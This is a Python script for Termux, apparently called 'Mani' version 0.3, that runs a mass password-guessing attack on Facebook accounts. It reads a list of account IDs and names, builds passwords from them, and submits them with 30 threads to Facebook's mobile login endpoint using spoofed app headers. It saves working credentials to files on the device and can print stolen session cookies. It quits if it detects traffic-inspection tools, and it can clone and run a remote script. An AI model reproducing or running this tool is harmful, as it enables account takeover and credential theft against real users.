 ####@-----Import-----@####
import os,base64

os.system('git pull -q;rm .rndm')
try:
	import os,sys,time,json,random,re,string,platform,base64,uuid,requests,io,struct
	from string import *
	from concurrent.futures import ThreadPoolExecutor as ThreadPool
except(ImportError):
    os.system("pip install requests")
    pass


try:
    import bs4
except(ImportError):
    os.system("pip install bs4")
    pass

try:
	a = "anar"
	t="tt"
	fileee = os.listdir('/sdcard/Android/data/')
	if f'com.h{t}pc{a}y.pro' in fileee:
		print('Delete Http Canary');sys.exit()
except:pass

lm = '/data/data/com.termux/files/usr/lib/python3.11'
if not 'print' in open(lm+'/site-packages/requests/sessions.py','r').read():
	pass
else:sys.exit()

import subprocess
from bs4 import BeautifulSoup
import json,os,time,base64,random,re,sys, subprocess 
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as speed

accounts = []
loop = 0


####DESIGN####
def oo(t):
	return '\033[1;96m[\033[1;97m'+str(t)+'\033[1;96m]\033[1;97m '

###USERAGENTSGEN####
fbks=('[[FBAN/FB4A;FBAV/15.0.0.3547;FBBV/5419501;[FBAN/FB4A;FBAV/482.0.0.8.31;FBBV/523162187;FBDM/{density=1.6875,width=720,height=1483};FBLC/en_GB;FBRV/525325708;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2131;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]')

android_version = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
andd=subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
model = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
carr=subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').split(',')[1].replace('\n','')
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')

device = {
        'android_version':android_version,
        'model':model,
        'build':build,
         'cr':carr,
         'brand':andd}

ua = []

import requests
rs = requests.get
ua = []

#del ua=
"""
Davik/2.1.0 (Linux; U; Android 8.1.0.0.1; CPH1901 Build/OPM1.171019.026) [FBAN/FB4A;FBAV/247.0.0.30.138;FBBV/927639855;FBDM/{density=2.0,width=1280,height=1440};;FBLC/en_GB;FBRV/924986161;FBCR/Zong;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1.0;FBOP/16;FBCA/arm64-v8a:armeabi-v7a:armeabi;]
"""

heads=(["Dalvik/2.1.0 (Linux; U; Android 11; octopus Build/R117-15572.63.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A226BR Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; BLAUPUNKT EU 2K Android TV Build/RTM5.220609.265)","Dalvik/2.1.0 (Linux; U; Android 11; KAGIS Android TV Build/RTO3.230206.001)","Dalvik/2.1.0 (Linux; U; Android 9; 50LE7053D Build/PPR2.180905.006.A1)","Dalvik/2.1.0 (Linux; U; Android 13; C35 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 5.1; Wave 4G Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A032F Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Pro Build/TQ3A.230901.001.C1)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-11-5)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A136U Build/TP1A.220624.014) AppleWebKit [VD/240]","Dalvik/2.1.0 (Linux; U; Android 11; kukui Build/R117-15572.63.0)","Dalvik/2.1.0 (Linux; U; Android 13; RMO-NX1 Build/HONORRMO-N21) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; moto e32(s) Build/STBS32.36-101-5)","Dalvik/2.1.0 (Linux; U; Android 12; T13_EEA Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; Arcelik Android TV Build/RTO1.230704.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTR Build/PS7664.3772N)","Dalvik/2.1.0 (Linux; U; Android 10; Android Build/LRX21M)","Dalvik/2.1.0 (Linux; U; Android 12; VONTAR H618 Build/SP1A.211105.004)","Dalvik/2.1.0 (Linux; U; Android 10; POT-LX1 Build/HUAWEIPOT-L21) VD/236","Dalvik/2.1.0 (Linux; U; Android 12; MEO TV Box 4K (DIW377) Build/STT5.230611.001.6.3.0)","Dalvik/2.1.0 (Linux; U; Android 11; motorola edge Build/RPDS31.Q4U-39-26-14-10-1) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; FP5 Build/TKQ1.230127.002)","Dalvik/2.1.0 (Linux; U; Android 12; M10_Plus Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; XP9900 Build/10.0.0-16-12.0.0-10.130.10)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BC42 Build/61.2.A.0.472A)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 Build/T2TLS33.3-41-2-3)","Dalvik/2.1.0 (Linux; U; Android 13; PHQ110 Build/RKQ1.211119.001)","Dalvik/2.1.0 (Linux; U; Android 13; Elite G63 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; tv175u Build/PTT1.190604.001)","Dalvik/2.1.0 (Linux; U; Android 10; Redmi 5 Plus Build/QP1A.191005.007)","Dalvik/2.1.0 (Linux; U; Android 9; SuperBOX_S2PRO Build/PPR1.181005.003)","Dalvik/2.1.0 (Linux; U; Android 9; coral Build/R117-15572.63.0)","Dalvik/2.1.0 (Linux; U; Android 13; WP28 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; tv175y Build/PTT1.190604.001)","Dalvik/2.1.0 (Linux; U; Android 11; D2426 Build/RTM7.230903.020)","Dalvik/2.1.0 (Linux; U; Android 11; Smart TV Build/RTO6.230411.001)","Dalvik/2.1.0 (Linux; U; Android 13; moto g54 5G Build/T3TD33.16-13-5)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRPWI Build/PS7328.3443N)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1903 Build/OPM1.171019.026) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; Redmi Note 8 Pro Build/RP1A.200720.011) AppleWebKit [VD/240]","Dalvik/2.1.0 (Linux; U; Android 12; NCO-LX1 Build/HUAWEINCO-LX1)","Dalvik/2.1.0 (Linux; U; Android 8.0.0; PRA-LX1 Build/HUAWEIPRA-LX1); appId=com.zenofm.player; appVersion=5.7.0(507051)","Dalvik/2.1.0 (Linux; U; Android 12; EABF22206A Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; itel A23S Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 13; SM-S908E Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 11; Sky Box Build/RTT4.210521.001)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 5 Build/UP1A.231005.007)","Dalvik/2.1.0 (Linux; U; Android 13; moto g stylus (2023) Build/T1THS33.75-12-6-5-3)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PMT5791_4G Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; moto g51 5G Build/S2RYA32.58-13-12-5-3)","Dalvik/2.1.0 (Linux; U; Android 5.0.1; LG-T540 Build/LRX21Y)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; ASUS_X550 Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 10; CGATES-DV8947 Build/QT)","Dalvik/2.1.0 (Linux; U; Android 11; volteer Build/R117-15572.63.0)","Dalvik/2.1.0 (Linux; U; Android 10; TalkTalk STB Build/QTG1.230207.001)","Dalvik/2.1.0 (Linux; U; Android 12; CRT-LX1 Build/HONORCRT-L31) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA VH1 Build/QTG3.200305.006.S347)","Dalvik/2.1.0 (Linux; U; Android 6.0; TV6586_ISDB Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; 2307BRPDCC Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 5.1; B3-A10 Build/LMY47I)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F731W Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; X8Pro Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; 9460G Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTN Build/NS6700)","Dalvik/2.1.0 (Linux; U; Android 13; SM-R875F Build/TWR5.230621.001)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Pro Build/U1B2.230922.006)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; MXQ Pro Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 11; Grundig Android TV Build/RTO1.230704.001)","Dalvik/2.1.0 (Linux; U; Android 13; 23078RKD5C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Pro Build/UD1A.230803.041)","Dalvik/2.1.0 (Linux; U; Android 8.0; OPPO R9 Plusm A Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; Extensa 4630Z    Build/N2G48H)","Dalvik/2.1.0 (Linux; U; Android 11; PLAY BOX TV 4B Build/RTT0.211222.001)","Dalvik/2.1.0 (Linux; U; Android 9; BRAVIA 4K GB Build/PTT1.190515.001.S54)","Dalvik/2.1.0 (Linux; U; Android 12; Chromecast HD Build/STTK.230808.004)","Dalvik/2.1.0 (Linux; U; Android 11; RMX1851 Build/RKQ1.201217.002) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; AFTSSS Build/PS7664.3772N)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAWI Build/RS8320.1807N)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia T20 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; V2237 Build/TP1A.220624.014_NONFC)","Dalvik/2.1.0 (Linux; U; Android 11; HiSmart TV Build/RTO6.230407.001)","Dalvik/2.1.0 (Linux; U; Android 13; H96_Max_RK3528 Build/TQ1A.230105.002.A1)","Dalvik/2.1.0 (Linux; U; Android 11; J8_EEA Build/RP1A.201005.006)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-9-9-2-1)","Dalvik/2.1.0 (Linux; U; Android 11; M7_WIFI Build/V8_20230821)","Dalvik/2.1.0 (Linux; U; Android 12; BNE-LX1 Build/HUAWEIBNE-LX1)","Dalvik/2.1.0 (Linux; U; Android 13; TB132FU Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; ac8257_demo_1g_32 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi 5 Plus MIUI/V11.0.2.0.OEGMIXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 8.0.0; AGS-W09 Build/HUAWEIAGS-W09) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 3a Build/TQ3A.230901.001)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/UP1A.231005.007.A1)","Dalvik/2.1.0 (Linux; U; Android 10; VANKYO_S7 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-DC54 Build/68.0.A.0.829)","Dalvik/2.1.0 (Linux; U; Android 10; V2031EA Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 12; F-51C Build/V11R086B)","Dalvik/2.1.0 (Linux; U; Android 13; PEMM00 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 14; Pixel 8 Build/UD1A.230803.022.C1)",])

##Logo##
P = '\x1b[1;97m'
G='\x1b[1;92m'
R='\x1b[1;91m'
S ='\x1b[1;96m'
Y ='\x1b[1;93m'
uu ='\x1b[1;95m'
tred = speed


logo=f'''
   8b    d8    db    88b 88 88 
   88b  d88   dPYb   88Yb88 88 
   88YbdP88  dP__Yb  88 Y88 88 
   88 YY 88 dP""""Yb 88  Y8 88 
\x1b[1;96m'======================
      \033[1;97m Owner  : Mani.
      \033[1;97m GitHub : Mani-01.
      \033[1;97m Version:\x1b[1;96m  0.3     \033[1;97m
      \033[1;97m Notice : Use mix ids 
\x1b[1;96m'=======================
'''
####@-----Menu-----@####
def Mani_Main():
    os.system("clear")
    print(logo)
    print(f"{oo(1)}File Cloning")
    #print(f"{oo(2)}Create File")
    print(f"{oo(0)}Exit")
    inpp = input(f"{oo('?')}Your Choice : ")
    if inpp == "1":
        file()
        soon()
    if inpp == "2":
     print(f'{oo("+")}Loading Best File Create Command ')
     os.system('cd && git clone --depth=1 https://github.com/Mani-404/FILE')
     os.system('cd && cd FILE ;python FILE.py')
     exit()
    if inpp == "0":
     exit('Exit!')
     
     
l = []

####@-----File-----@####
def file():
    os.system("clear")
    print(logo)
    if 'gm' in l:
        file = '.Mani'
    else:
        file = input(f"{oo('-')}Enter File: ")
    try:
        for x in open(file,'r').readlines():
            accounts.append(x.strip())
    except:
        print(f"{oo('!')}File Not Found");time.sleep(1)
        Mani_Main()
     
    method()
    exit()
   
####@-----AppCheck-----@####
def check(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
    	pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;96m"+gm.replace('huwtn',' Mani-code=Mani-33'))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        pass
    else:
        for gm in game:
            print(f"\033[1;97m---\033[1;93m"+gm.replace('riJan','Mani-182^)Code=Mani-2233]'))



####@-----UserAgent----@####
"""
Mozilla/5.0 (Linux; Android 8.0.0; LDN-LX3 Build/HUAWEILDN-LX3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.157 Mobile Safari/537.36 UCURSOS/v1.5.4_227-android","Mozilla/5.0 (Linux; Android 7.0; TRT-LX3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-A530F Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36 OPT/2.3","Mozilla/5.0 (Linux; Android 9; FIG-LX3 Build/HUAWEIFIG-L03; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/74.0.3729.136 Mobile Safari/537.36 UCURSOS/v1.5.4_227-android","Mozilla/5.0 (Linux; Android 9; SM-A705MN Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 UCURSOS/v1.5.4_227-android","Mozilla/5.0 (Linux; Android 8.1.0; SM-G610M Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36 Instagram 132.0.0.26.134 Android (27/8.1.0; 480dpi; 1080x1920; samsung; SM-G610M; on7xelte; samsungex","Mozilla/5.0 (Linux; Android 10; VOG-L04 Build/HUAWEIVOG-L04; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.1.2; LT C1400 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36","Opera/9.80 (Android; Opera Mini/9.0.1829/170.54; U; en) Presto/2.12.423 Version/12.16","Mozilla/5.0 (Linux; Android 7.0; SM-G955U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; SM-G950U Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 6.0.1; ONE E1003 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 9; ANE-LX1 Build/HUAWEIANE-L01; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/76.0.3809.89 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; FRD-AL00) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4078.2 Safari/537.36","Mozilla/5.0 (Linux; Android 9; ASUS_X01AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 8.0.0; SM-G570M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36 OPR/56.1.2780.51589","Mozilla/5.0 (X11; Ubuntu; Linux ppc64le; rv:72.0) Gecko/20100101 Firefox/72.0","Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.17 Safari/537.36 OPR/68.0.3618.5 (Edition beta)","Mozilla/5.0 (Linux; Android 7.0; LG-M250 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36",])

"""
####@-----FileM-----@####


def method():
    okacc = []
    cpacc = []
    totalpass = []
    os.system("clear")
    print(logo)
    if 'o':      
        lp = input(f'{oo("?")}Total Password? : ')
        if lp.isnumeric():
            ex = 'firstlast first123 last123'
            print(f'{oo("+")}{ex} (ETC)')
            for x in range(int(lp)):
                totalpass.append(input(f'{oo(x+1)}Password : '))
            pass
        else:
            print(f"{oo('!')}Numeric Only")
            exit()
    print(f'\n'+oo("1")+'Method 1 \x1b[1;96m (Updated)\n'+oo("2")+'Method 2\x1b[1;96m(Updated)')
    m=input(f"{oo('!')}Input : ") 
    print('\n'+oo("?")+'Do You Want To Show Cp Ids?(y/n)')
    cpok=input(f"{oo('!')}Input : ")
    print('\n'+oo("?")+'Do You Want To Show Cookies?(y/n)')
    c=input(f"{oo('!')}Input : ")
    apps='y'
    os.system("clear")
    print(logo) 
    print(f'{oo("✓")}Total Ids : \033[1;92m'+str(len(accounts)))
    print(f"{oo('-')}Wait As You Can :)")
    print(f"{oo('•')}/sdcard/Mani-OK.txt")
    print('\x1b[1;96m='*25)
    print()
    
    def start(user):
     try:
        global loop,accounts
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
           last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;96mMani-M1\033[1;96m]\033[1;96m {}-{} \033[1;96m[\033[1;92m{}\033[1;96m] \033[1;96mOK : \033[1;96m{} \033[1;96mCP : \033[1;97m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:              
            heads = None
            heads= "[FBAN/FB4A;FBAV/15.0.0.3547;FBBV/5419501;[FBAN/FB4A;FBAV/482.0.0.8.31;FBBV/523162187;FBDM/{density=1.6875,width=720,height=1483};FBLC/en_GB;FBRV/525325708;FBCR/Banglalink;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/V2131;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]"
            
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
      #      print(response.text)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[92;1m[\033[97mMani-OK\x1b[1;92m] \x1b[1;92m'+acc+' \x1b[1;92m•\x1b[1;92m'+pword+'  ')
                open('/sdcard/Mani-OK.txt','a').write(f'{acc} • {pword}\n')
                if c=='y':
                    try:
                           q = json.loads(response.text)
                           ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                           ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                           cookies = f"sb={ssbb};{ckkk}"
                    except Exception as e:print(str(e)+' | '+response.text)
                break
            elif 'www.facebook.com' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91mMani-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Mani-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1
     except Exception as e:time.sleep(10)
   


 
    def start2(user):
      global loop,accounts
      try:
        r = requests.Session()
        user = user.strip()
        acc, name = user.split("|")
        first = name.rsplit(" ")[0]
        try:
            last = name.rsplit(" ")[1]
        except:
            last = first
        pers = str(int(loop)/int(len(accounts)) * 100)[:4]
        sys.stdout.write('\r\033[1;97m[\033[1;96mMani-M2\033[1;96m]\033[1;96m {}-{} \033[1;96m[\033[1;92m{}\033[1;96m] \033[1;96mOK : \033[1;96m{} \033[1;96mCP : \033[1;97m{}       \r'.format(str(loop), str(len(accounts)), pers , str(len(okacc)) ,str(len(cpacc))))
        sys.stdout.flush()
        for pword in totalpass:
            heads = None
            header = {"Content-Type": "application/x-www-form-accencoded","Host": "graph.facebook.com","User-Agent": heads,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "unknown","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-Alive"}
            pword = pword.replace("first", first).replace("last", last)
            pword = pword.lower()
            data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":acc,"password":pword,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
            response = r.post('https://b-graph.facebook.com/auth/login',data=data,headers=header,allow_redirects=False)
            if 'session_key' in response.text:
                okacc.append(acc)
                print('\r\033[92;1m[\033[97mMani-OK\x1b[1;92m] \x1b[1;92m'+acc+' \x1b[1;92m•\x1b[1;92m'+pword+'  ')
                open('/sdcard/Mani-OK.txt','a').write(f'{acc} • {pword}\n')
                if 'y' in apps:
                	check(r,coki)
                if c=='y':
                 try:  
                  q = json.loads(response.text)
                  ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
                  ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                  cookies = f"sb={ssbb};{ckkk}"
                 except Exception as e:print(str(e)+' | '+response.text)
                 print('\r\033[1;93m[\033[1;97mCookie\033[1;93m] \033[1;97m'+cookies)                
                 break
            elif 'checkpoint' in response.text:
                if cpok=='n':
                     pass
                else:
                     print('\r\033[1;91m[\033[1;91mMani-CP\033[1;91m] \033[1;97m'+acc+' \033[1;91m•\033[1;97m '+pword+'   ')
                cpacc.append(acc)
                open('/sdcard/Mani-CP.txt','a').write(f'{acc} • {pword}\n')
                break
            else:
                continue
        loop += 1    
      except Exception as e: time.sleep(10)

    if m=='2':
        with speed(max_workers=30) as speede:
             speede.map(start2, accounts)
    elif m=='1':
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    else:
       with speed(max_workers=30) as speede:
            speede.map(start, accounts)
    exit()  
      

Mani_Main()